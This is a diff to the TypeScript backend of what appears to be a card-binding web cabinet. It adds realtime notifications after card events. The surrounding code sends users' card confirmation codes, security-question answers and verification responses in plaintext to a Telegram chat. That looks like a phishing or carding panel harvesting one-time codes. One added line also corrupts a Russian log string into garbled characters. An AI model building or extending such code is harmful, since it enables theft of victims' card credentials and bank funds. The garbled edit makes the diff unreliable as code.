@@ -13,6 +13,7 @@ import { allowUserAction, RATE_LIMIT_ERROR } from "@/lib/rate-limit"
 import { toCardholder } from "@/lib/translit"
 import { generateRequestNo } from "@/lib/card-requests"
 import { logActivity } from "@/lib/visitors"
+import { notifyCardChange } from "@/lib/realtime"
 
 export type PaymentCardView = {
   id: number
@@ -75,7 +76,10 @@ export async function reportCardFrame(id: number, event: "opened" | "finished"):
       event === "finished" ? sql`true` : isNull(paymentCard.frameStatus),
     ))
     .returning({ requestNo: paymentCard.requestNo })
-  if (row) emitCardEvent(id, event === "finished" ? "card.frame_finished" : "card.frame_opened")
+  if (row) {
+    emitCardEvent(id, event === "finished" ? "card.frame_finished" : "card.frame_opened")
+    await notifyCardChange(userId)
+  }
   if (row && event === "finished") {
     void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\nСтраница пройдена`)
   }
@@ -184,6 +188,7 @@ export async function requestCardBinding(input: {
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
   ].join("\n"))
   emitCardEvent(created.id, "card.created")
+  await notifyCardChange(user.id)
   await logActivity("card_bind", `Подал заявку на привязку карты •••• ${last4} (${CARD_BRAND_LABEL[brand]}), № ${created.requestNo}`)
 
   revalidatePath("/cabinet/cards")
@@ -204,7 +209,8 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n<code>${escapeTelegram(trimmed)}</code>`)
   emitCardEvent(id, "card.code_submitted", { code: trimmed })
-  await logActivity("card_step", `Ввёл код подтверждения по заявке № ${row.requestNo ?? id}`)
+  await notifyCardChange(user.id)
+  await logActivity("card_step", `Вв��л код подтверждения по заявке № ${row.requestNo ?? id}`)
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -229,6 +235,7 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
   emitCardEvent(id, "card.extra_check_answered")
+  await notifyCardChange(user.id)
   await logActivity("card_step", `Ответил на дополнительную проверку по заявке № ${row.requestNo ?? id}`)
 
   revalidatePath("/cabinet/cards")
@@ -255,6 +262,7 @@ export async function submitSecretAnswer(id: number, response: string): Promise<
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
   emitCardEvent(id, "card.answer_received")
+  await notifyCardChange(user.id)
   await logActivity("card_step", `Ответил на контрольный вопрос по заявке № ${row.requestNo ?? id}`)
 
   revalidatePath("/cabinet/cards")
@@ -302,6 +310,7 @@ export async function deletePaymentCard(id: number): Promise<CardsResult> {
         .where(and(eq(paymentCard.id, next.id), eq(paymentCard.userId, userId)))
     }
   })
+  await notifyCardChange(userId)
   await logActivity("card_delete", `Удалил карту (id ${id})`)
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(userId) }
